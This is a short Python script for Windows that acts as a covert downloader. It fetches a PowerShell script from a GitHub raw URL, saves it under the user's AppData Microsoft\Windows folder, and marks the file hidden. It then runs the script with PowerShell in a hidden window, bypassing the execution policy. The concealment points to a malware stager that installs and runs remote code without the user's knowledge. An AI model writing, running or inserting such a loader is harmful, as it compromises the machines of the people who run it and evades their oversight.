import os
import ctypes
import subprocess
import urllib.request

DIR_A = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows")
PATH_A = os.path.join(DIR_A, "A.ps1")
URL_A = "https://raw.githubusercontent.com/AI-USE/data/refs/heads/main/script/A.ps1"

def set_hidden(path):
    ctypes.windll.kernel32.SetFileAttributesW(path, 0x02)

def download_and_save(url, path):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with urllib.request.urlopen(url) as r, open(path, "wb") as f:
        f.write(r.read())
    set_hidden(path)

def run_powershell(script):
    subprocess.Popen([
        "powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", script
    ])

download_and_save(URL_A, PATH_A)
run_powershell(PATH_A)
